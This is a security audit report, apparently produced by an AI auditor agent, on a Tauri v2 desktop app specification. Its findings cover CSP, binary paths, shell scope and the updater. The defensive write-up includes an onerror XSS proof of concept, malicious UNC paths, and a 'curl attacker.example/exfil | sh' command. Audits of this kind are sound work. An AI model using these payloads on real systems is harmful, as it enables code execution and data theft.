# Security Audit Report #38

> **Auditor:** Security Auditor Agent (Security Engineer)
> **Date:** 2026-08-10
> **Scope:** Spec-only audit of `docs/specs/desktop-app-tauri.md` (v0.1, Draft) — Tauri v2 desktop app wrapper. No implementation exists yet; all findings are specification gaps that must be resolved before coding begins. Cross-referenced against `docs/specs/gui-and-harness-adapters.md` (v0.1) and previous audit #37.
> **Dependencies:** 0 production vulnerabilities (`npm audit --omit=dev`). 6 devDependency vulnerabilities (Vitest/Vite/esbuild — unchanged from audit #37, not blocking).
> **Previous audits:** #37 reported HIGH risk on the GUI/harness spec. Two of the seven focused questions below intersect directly with audit #37's unresolved HIGH-1 (DOM XSS). That finding is now escalated in the Tauri context because the CSP as written provides less protection than §12.1 claims.

---

## Overall Risk Rating: **HIGH**

The spec introduces a native binary execution surface, a Tauri shell-spawn capability, and an auto-updater — all of which are high-value attack targets. Two High findings are directly exploitable from within the WebView if the spec is implemented as written. Neither blocks D1 scaffold work, but both must be resolved before D2 (binary discovery + lifecycle) and D3 (IPC + frontend) land.

---

## Summary

| Severity | Count |
| -------- | ----- |
| Critical | 0     |
| High     | 2     |
| Medium   | 4     |
| Low      | 4     |
| Info     | 2     |

---

## Findings

---

### [HIGH-1] CSP `'unsafe-inline'` in `default-src` invalidates §12.1's script-src security claim

- **Location:** `docs/specs/desktop-app-tauri.md` §5.2, §12.1
- **Description:** The CSP in §5.2 is:

  ```
  default-src 'self' http://127.0.0.1:* 'unsafe-inline';
  connect-src http://127.0.0.1:*;
  img-src 'self' data:
  ```

  No explicit `script-src` directive is defined. Per the CSP Level 3 specification, `script-src` falls back to `default-src` when absent. Therefore the **effective** `script-src` is `'self' http://127.0.0.1:* 'unsafe-inline'`.

  Section §12.1 asserts: *"script-src 'self' — no inline scripts injected by model output can execute."* This claim is **factually incorrect** given the CSP as written. `'unsafe-inline'` allows:
  - Inline `<script>` blocks: `<script>fetch(...)</script>`
  - HTML event handler attributes: `<img onerror="maliciousCode()">`
  - `javascript:` URI navigation on some WebView configurations

  The `'unsafe-inline'` token is presumably included to allow inline CSS for the loading splash in `desktop/src/main.ts`. However, it was placed in `default-src`, which propagates it to `script-src` — a critical mistake.

  Combined with audit #37's unresolved HIGH-1 (DOM XSS via `innerHTML` in the GUI spec's `chat.js`), this creates a complete exploit chain: an LLM response containing `<img src=x onerror="...">` passes `stripControl()`, gets inserted via `innerHTML`, and executes inside the Tauri WebView with `'unsafe-inline'` permitting the event handler.

- **Impact:** Arbitrary JavaScript execution within the `http://127.0.0.1:<port>` origin. From inside the WebView an attacker can:
  - Invoke any of the four IPC commands: `shutdown_server`, `get_binary_path`, `get_server_url`, `get_version`
  - Exfiltrate conversation history via `connect-src` (which allows all local ports)
  - Trigger server shutdown via `invoke("shutdown_server")`

  The Tauri IPC layer does not add a second authentication factor — any script executing in the `main` window has full access to all permitted IPC commands.

- **Proof of concept:** Model replies with `<img src=x onerror="import('@tauri-apps/api/core').then(m=>m.invoke('shutdown_server'))">`. If `chat.js` uses `innerHTML` (HIGH-1 from audit #37) and the CSP allows `'unsafe-inline'`, the server shuts down on the next model reply.

- **Recommendation:** Split the CSP into explicit per-directive definitions to prevent `default-src` from contaminating `script-src`:

  ```
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src http://127.0.0.1:*;
  img-src 'self' data:;
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  form-action 'self'
  ```

  The `'unsafe-inline'` is permitted only in `style-src` (for inline styles used by the loading splash). `script-src 'self'` means only scripts loaded from the Tauri asset bundle execute — inline scripts and event handlers are blocked. The additional directives (`frame-ancestors`, `base-uri`, `object-src`, `form-action`) are addressed separately as LOW-4.

  This fix must appear in §5.2 before D3 (frontend IPC work) begins. The acceptance criterion D4 ("CSP blocks `eval()` in the WebView") should be extended to also assert that `'unsafe-inline'` is absent from the effective `script-src`.

---

### [HIGH-2] Binary path allowlist permits Windows UNC paths — remote binary execution

- **Location:** `docs/specs/desktop-app-tauri.md` §12.2
- **Description:** The binary path allowlist is defined as `[a-zA-Z0-9._/\\ :-]`. The backslash `\` character is in the allowlist (required for Windows drive-letter paths like `C:\Users\...`). On Windows, UNC (Universal Naming Convention) paths begin with two backslashes followed by a hostname:

  ```
  \\attacker.example\share\llmup.exe
  \\192.168.1.100\c$\windows\system32\cmd.exe
  ```

  A UNC path passes every check in §12.2:
  - **"Must be an absolute path"** — Windows treats UNC paths as absolute.
  - **"Must exist and be executable"** — `std::fs::metadata` resolves UNC paths via SMB, returning success if the remote share is accessible.
  - **"Must not contain shell metacharacters"** — `\\attacker.example\share\llmup.exe` contains only `\`, `.`, alphanumerics — all in the allowlist.

  Attack vector: On Windows enterprise networks, an attacker who can respond to SMB requests on the local network (LLMNR/NBNS poisoning, rogue SMB server, or a compromised network share) can serve a malicious executable to any user whose Tauri app resolves a UNC path for the `llmup` binary. This is realistic when the user sets `LLMUP_BIN` to a network path (e.g., a shared developer toolchain) or when PATH resolution on a domain-joined machine includes a UNC share.

- **Impact:** Remote code execution as the current OS user. The Tauri app spawns the attacker's binary with `Command::new(path).arg(...)` — no shell interpolation, but the binary itself is fully attacker-controlled.

- **Recommendation:** §12.2 must add an explicit platform-specific check: **"On Windows, the path must not start with `\\` (two backslashes). UNC paths are unconditionally rejected."** In Rust:

  ```rust
  #[cfg(target_os = "windows")]
  if path.starts_with(r"\\") {
      return Err(AppError::InvalidBinaryPath("UNC paths are not permitted"));
  }
  ```

  This is a one-line guard that closes the entire class. The acceptance criterion D4 ("Binary path with `../` is rejected") should be extended with: "Binary path starting with `\\` on Windows is rejected before spawn."

---

### [MEDIUM-1] `shell:allow-execute` scope definition is absent from the spec

- **Location:** `docs/specs/desktop-app-tauri.md` §5.3
- **Description:** §5.3 states that `shell:allow-execute` is *"scoped to the `llmup` binary and the `npx` fallback only — Tauri v2's shell scope prevents the WebView from spawning arbitrary processes."* The spec does not show the actual scope configuration.

  In Tauri v2, `shell:allow-execute` without an explicit scope in the capability JSON permits the WebView to call `invoke("plugin:shell|execute", { program: "any_binary" })` for **any** binary. The scoping is a separate `shell` plugin scope block that must be explicitly present. Citing the Tauri v2 capability model, the spec's claim of automatic scoping is only true if the scope is configured — it is not the default behaviour of the permission token alone.

  Without the scope block shown in the spec, an implementor who copies §5.3 verbatim produces a `main-capability` that grants the WebView unrestricted `shell:allow-execute`. A malicious or injected script in the WebView can then spawn `sh -c "curl attacker.example/exfil | sh"` or any other binary on PATH.

- **Impact:** If misconfigured, the WebView can spawn arbitrary shell commands — the most dangerous Tauri permission. This collapses the entire security boundary of the application.

- **Recommendation:** §5.3 must show the complete Tauri v2 capability JSON including the explicit shell scope. The scope for `llmup` and `npx` in Tauri v2 capability format looks like:

  ```json
  {
    "identifier": "main-capability",
    "permissions": [
      "core:default",
      {
        "identifier": "shell:allow-execute",
        "allow": [
          { "name": "llmup", "cmd": "llmup", "args": { "validator": "\\S+" } },
          { "name": "npx", "cmd": "npx", "args": ["--no-install", "local-llmup"] }
        ]
      },
      "notification:default"
    ]
  }
  ```

  (Exact syntax depends on Tauri v2 final release; the spec must reference the Tauri v2 shell scope docs and show a concrete example.) Acceptance criterion D4 should add: "WebView cannot invoke `shell:allow-execute` with a binary other than `llmup` or `npx local-llmup`."

---

### [MEDIUM-2] Port race window enables local DoS and potential WebView misdirection

- **Location:** `docs/specs/desktop-app-tauri.md` §3.5
- **Description:** §3.5 describes the port probe mechanism: Rust binds a `TcpListener` on `127.0.0.1:0`, gets the OS-assigned port, **closes the listener**, then passes the port number to `llmup gui`. There is a race window between closing the listener and `llmup gui` re-binding on that port. Any process with loopback access can observe the LISTEN state disappear and immediately bind on the freed port.

  The spec partially mitigates this: *"the `llmup gui` server reports its actual bound port in JSON; the Rust backend uses that URL, not the probed port."* This means if `llmup gui` fails to bind (port stolen), it will exit with code 1, triggering the error dialog. The WebView will NOT be navigated to the attacker's port because the URL comes from llmup's stdout (not from the HTTP server on that port).

  However, two residual risks remain:
  1. **DoS by repeated port theft**: An aggressive local process can repeatedly steal OS-assigned ports, preventing the desktop app from starting indefinitely. This is a denial-of-service against the application with no in-spec recovery path.
  2. **Race narrowness is not guaranteed**: The spec does not place any constraint on how quickly `llmup gui` must attempt the bind after receiving the port argument. On a loaded system, the window can be hundreds of milliseconds wide.

- **Impact:** Local DoS (application cannot start). The WebView misdirection risk is low given the JSON-from-stdout mitigation, but the spec does not document the reasoning, leaving implementors unaware of why the design is safe.

- **Recommendation:** §3.5 should document the security reasoning explicitly: *"The Rust backend uses the URL reported in `llmup gui` stdout — not the probed port — so a port-stealing attacker cannot redirect the WebView to their service. The residual risk is local DoS; no in-process retry is specified; the user can re-launch."* Additionally, §12 (threat model) should list port-theft DoS as a known, accepted residual risk. No code change needed — only documentation.

---

### [MEDIUM-3] `npx --no-install local-llmup` fallback resolves against local `node_modules`

- **Location:** `docs/specs/desktop-app-tauri.md` §3.3 (discovery step 5)
- **Description:** Discovery step 5 falls back to `npx --no-install local-llmup` when `llmup` is not found via PATH or hardcoded paths. `npx --no-install` prevents registry fetching but **still resolves against the local `node_modules` tree** in the current working directory and all parent directories (npm hoisting).

  If the Tauri app is launched from a workspace directory that has an outdated, patched, or compromised version of `local-llmup` in `node_modules` (e.g., a developer's project that pinned an old version, or a workspace attacked via dependency confusion), `npx --no-install local-llmup` silently runs that local version — not the system-installed one. The user sees no warning.

  Furthermore, the current working directory of the Tauri app process is not guaranteed to be a safe, attacker-uncontrollable path. On macOS, the working directory at launch from Finder is typically `/`, but from Terminal or a CI script it can be any directory.

- **Impact:** The fallback path can execute a different, potentially vulnerable or compromised `local-llmup` binary without any user-visible indication. This is a confused deputy attack: the security policy targets the "installed llmup binary" but the fallback can silently select a different one.

- **Recommendation:** Remove the `npx --no-install local-llmup` fallback from §3.3. Replace it with an explicit error → "Install local-llmup first" dialog. The install dialog already shows the `npm install -g local-llmup` command; `npx` as a silent fallback adds supply-chain risk with no corresponding security benefit. If a fallback is retained for UX reasons, it must (a) print a warning in the error dialog naming the resolved path, (b) require the path to pass the absolute-path validation (resolving the npx shim to its real target), and (c) note that a user who doesn't have it installed globally will not be helped by a `node_modules` resolution.

---

### [MEDIUM-4] Tilde path `~/.local-llmup/bin/llmup` is not expandable through the binary allowlist

- **Location:** `docs/specs/desktop-app-tauri.md` §3.3 (discovery step 2), §12.2
- **Description:** Discovery step 2 specifies `~/.local-llmup/bin/llmup` as a candidate path. The tilde `~` character is **not** in the binary path allowlist `[a-zA-Z0-9._/\\ :-]`.

  The spec does not state whether path validation in §12.2 runs before or after tilde expansion. Two failure modes:
  - **Validation before expansion**: the path `~/.local-llmup/bin/llmup` contains `~`, fails the allowlist, is rejected. The discovery step silently skips a valid install location.
  - **Validation after expansion**: `~` is expanded to `/Users/username` (macOS) or `C:\Users\username` (Windows) before validation. The expanded path passes. This is the correct behavior but the spec does not mandate it.

  This ambiguity is an implementation trap: a strict reading of §12.2 ("must not contain shell metacharacters — strict allowlist") would reject `~` as a non-listed character. The implementor who follows §12.2 literally will have a bug where the managed install path is never used.

- **Impact:** Silent skip of the managed install location; fallback to PATH or `npx` fallback (with its own risk — see MEDIUM-3). No security escalation, but the spec is internally inconsistent.

- **Recommendation:** §3.3 and §12.2 must be reconciled. The fix is a single sentence in §12.2: *"Paths returned by discovery are fully expanded to absolute form (tilde expansion, symlink resolution via `std::fs::canonicalize`) before validation. The allowlist is applied to the canonicalized absolute path only."* With `canonicalize`, `~` never reaches the validator; `/Users/username/.local-llmup/bin/llmup` does.

---

### [LOW-1] Auto-update rollback attack not addressed

- **Location:** `docs/specs/desktop-app-tauri.md` §9, §12.3
- **Description:** The updater verifies the Ed25519 signature on update artifacts and requires HTTPS. However, the spec does not mandate a minimum-version check. Tauri's updater accepts any signed artifact from the update manifest — including a version older than the currently installed one.

  A threat actor who can modify the GitHub Releases `latest.json` manifest (or perform a CDN cache poisoning) and who has access to the signing key can force a downgrade to a version with known vulnerabilities. Even without key access, a race against a freshly published manifest can substitute the previous version's artifact (if it's still available at the same URL) if Tauri does not validate the version field is strictly newer.

- **Recommendation:** §12.3 should add: *"The Rust updater checks that the version field in the manifest is strictly greater than the current app version (`semver::Version::gt`) before downloading. A manifest with equal or lower version is silently ignored."* This is a one-line Rust guard in the updater callback. Note as a known limitation: the signing key compromise scenario is not mitigated by versioning alone — it requires key rotation, which is a shipping/operational concern outside this spec.

---

### [LOW-2] System tray icon impersonation not documented as a known limitation

- **Location:** `docs/specs/desktop-app-tauri.md` §7, §12
- **Description:** macOS and Windows provide no exclusive registration mechanism for system tray icons. Any application on the system can create a tray icon using the same image as `local-llmup`. A social-engineering attacker with local code execution can display a convincing fake tray icon that intercepts user clicks, shows fake "model ready" notifications, and prompts for actions (e.g., "Enter your API key to continue").

  This is an inherent OS-level limitation, not a Tauri or spec defect. The finding is raised because §12 does not acknowledge it, leaving the threat model incomplete.

- **Recommendation:** Add to §12: *"System tray icon impersonation: any local process can display an icon matching local-llmup's icon. This is an inherent OS limitation with no in-application mitigation. Users should verify they launched local-llmup from their application bundle, not from an unfamiliar icon."* No implementation change required.

---

### [LOW-3] `connect-src http://127.0.0.1:*` wildcard port enables lateral movement from WebView

- **Location:** `docs/specs/desktop-app-tauri.md` §5.2, §12.1
- **Description:** `connect-src http://127.0.0.1:*` allows the WebView to make `fetch()` and XHR requests to **any port** on the local machine. This is correct for the primary use case (reaching the `llmup gui` server on its assigned port). However, if a script executes in the WebView (via HIGH-1 if unresolved), it can probe and interact with any local HTTP service: local Postgres admin interfaces, Redis, Jupyter notebooks, development servers, internal dashboards, etc.

  This is a defense-in-depth concern: the CSP wildcard port is more permissive than necessary. The actual port used by `llmup gui` is known to the Rust backend at startup.

- **Recommendation:** At D3 implementation time, the Rust backend should dynamically set the CSP `connect-src` to the specific port assigned at runtime (e.g., `http://127.0.0.1:4017`) rather than `http://127.0.0.1:*`. The spec should note this as a hardening step: *"At runtime, the Rust backend replaces the `connect-src` port wildcard with the actual assigned port before the window is shown."* This is a meaningful defense-in-depth measure if HIGH-1 is not fully resolved.

---

### [LOW-4] Missing defensive CSP directives

- **Location:** `docs/specs/desktop-app-tauri.md` §5.2
- **Description:** The CSP in §5.2 omits several directives that are standard defense-in-depth for web content rendered in a controlled WebView:

  | Missing directive | Risk without it |
  |---|---|
  | `frame-ancestors 'none'` | Another page/frame could embed the app origin in an iframe |
  | `base-uri 'none'` | A `<base href="...">` tag injected into HTML would redirect all relative URL resolution |
  | `object-src 'none'` | Prevents plugin objects (Flash, Java applets) — irrelevant on modern platforms but zero-cost to add |
  | `form-action 'self'` | A form with `action="https://attacker.example"` could exfiltrate form data |

  These are low-impact in the Tauri WebView context (no cross-origin frames, no plugins) but are trivial to add and eliminate the surface entirely.

- **Recommendation:** Add all four directives to the CSP in §5.2 as shown in the HIGH-1 recommendation above.

---

### [INFO-1] `LLMUP_BIN` env var as test seam is also an attack seam on macOS

- **Location:** `docs/specs/desktop-app-tauri.md` §3.3 (discovery step 1)
- **Description:** `LLMUP_BIN` is the first and highest-priority discovery source. On macOS, a Login Item (launchd plist) or a `launchctl setenv` call made by any process running as the same user can inject environment variables into the Tauri app process. An attacker with local user-level code execution can permanently redirect binary discovery to a malicious binary by setting `LLMUP_BIN` in the user's launch environment.

  The binary path validation (§12.2) applies to the `LLMUP_BIN` value, so the malicious path must pass the allowlist. This is not a high bar — any absolute path containing only the allowed characters is accepted.

  This is noted as INFO rather than Medium because local code execution is already game-over for most security models, and `LLMUP_BIN` is explicitly documented as a test seam.

- **Recommendation:** §3.3 should document: *"`LLMUP_BIN` is intended as a test seam and should not be set in production deployments. In production, prefer the managed install path or homebrew paths."* No implementation change.

---

### [INFO-2] GitHub workflow `permissions: contents: write` is broad

- **Location:** `docs/specs/desktop-app-tauri.md` §10.3
- **Description:** The CI workflow stub in §10.3 sets `permissions: contents: write` at the job level. This grants the `GITHUB_TOKEN` write access to the entire repository contents for the duration of the build job. If the build step is compromised (supply-chain attack on a GitHub Action, a malicious Cargo dependency, or a compromised build host), the token could be used to push commits or overwrite release artifacts.

  This is an inherent risk of release workflows, but `contents: write` should be scoped to only the upload step, not the full build.

- **Recommendation:** §10.3 should specify: `permissions: contents: write` is moved to the `upload-artifact` step only (or to a dedicated release job separate from the build job), following GitHub's principle of least privilege for workflow tokens.

---

## §12 Threat Model Completeness Assessment

**The threat model in §12 is incomplete.** The following threat scenarios are either absent or only partially addressed:

| Threat | §12 Status | Finding |
|---|---|---|
| WebView XSS via `'unsafe-inline'` + `default-src` | ✗ Not addressed | HIGH-1 |
| Windows UNC path binary execution | ✗ Not addressed | HIGH-2 |
| `shell:allow-execute` overly broad scope | Claimed mitigated, scope not shown | MEDIUM-1 |
| Port race DoS | Partially addressed (§3.5); not in §12 | MEDIUM-2 |
| `npx` fallback supply-chain | ✗ Not addressed | MEDIUM-3 |
| Tilde expansion before validation | ✗ Not addressed | MEDIUM-4 |
| Auto-update rollback | ✗ Not addressed | LOW-1 |
| Tray icon impersonation | ✗ Not addressed | LOW-2 |
| `LLMUP_BIN` env injection via launchd | ✗ Not addressed | INFO-1 |
| PATH poisoning (§3.3 steps 3–4) | ✗ Not addressed | Inherent; document as accepted risk |
| Signing key compromise | ✗ Not addressed | Operational concern; reference shipping spec |

**Minimum additions required for §12 to be considered complete:**
1. Acknowledge that `'unsafe-inline'` was intentionally removed from `script-src` (after HIGH-1 is fixed).
2. Document the UNC path rejection on Windows.
3. Show the explicit `shell:allow-execute` scope configuration.
4. Document port-theft DoS as an accepted residual risk.
5. Acknowledge tray impersonation as an OS-level limitation with no in-app mitigation.

---

## Positive Observations

- **No shell interpolation**: §12.2 correctly mandates `Command::new(path).arg(...)` — no `sh -c` — which eliminates shell injection regardless of the path content. This is the correct pattern and is rare enough to deserve explicit praise.
- **Ed25519 for auto-update**: Correct algorithm choice. RSA or ECDSA would have been weaker defaults. Tauri's built-in verifier is appropriate.
- **Loopback-only binding**: The GUI server binds `127.0.0.1` (not `0.0.0.0`) — consistent with the project's established posture.
- **Secrets via env vars only**: The `TAURI_SIGNING_PRIVATE_KEY` is injected at build time via CI secrets, never hardcoded. §12.4 correctly defers secret wiring to the shipping spec.
- **SHA-pinned CI actions**: §10.3 mandates SHA-pinned `uses:` references and the existing `tests/workflows/workflow-policy.test.ts` enforces this — a strong supply-chain posture.
- **Hardened Runtime on macOS**: §12.4 specifies Hardened Runtime + notarization — this prevents injection attacks against the Tauri binary itself (e.g., DYLD injection on macOS).
- **Four IPC commands only**: The minimal IPC surface (`get_server_url`, `get_binary_path`, `shutdown_server`, `get_version`) is correctly scoped. No filesystem, network, or arbitrary-command IPC is exposed.

---

## Action Items (Priority Order)

| # | Severity | Finding | Recommendation |
|---|---|---|---|
| 1 | High | CSP `unsafe-inline` enables inline script execution, invalidates §12.1 | Split `default-src`; add explicit `script-src 'self'`; keep `style-src 'unsafe-inline'` |
| 2 | High | UNC path `\\server\share\evil.exe` passes binary allowlist on Windows | Reject paths starting with `\\` on Windows before spawn |
| 3 | Medium | `shell:allow-execute` scope not shown; overly broad if omitted | Show explicit Tauri v2 shell scope JSON in §5.3 |
| 4 | Medium | Port race DoS — no recovery path documented | Document in §12 as accepted residual risk; no code change |
| 5 | Medium | `npx --no-install` fallback resolves against local `node_modules` | Remove fallback; show install dialog only |
| 6 | Medium | Tilde `~` not in allowlist; validation-before-expansion inconsistency | Specify `canonicalize()` before validation in §12.2 |
| 7 | Low | Auto-update rollback not prevented | Mandate `version > currentVersion` check before download |
| 8 | Low | Tray icon impersonation not documented | Add to §12 as known OS limitation |
| 9 | Low | `connect-src` wildcard port; should be port-specific at runtime | Inject actual port into CSP at app startup |
| 10 | Low | Missing `frame-ancestors`, `base-uri`, `object-src`, `form-action` | Add to §5.2 CSP |
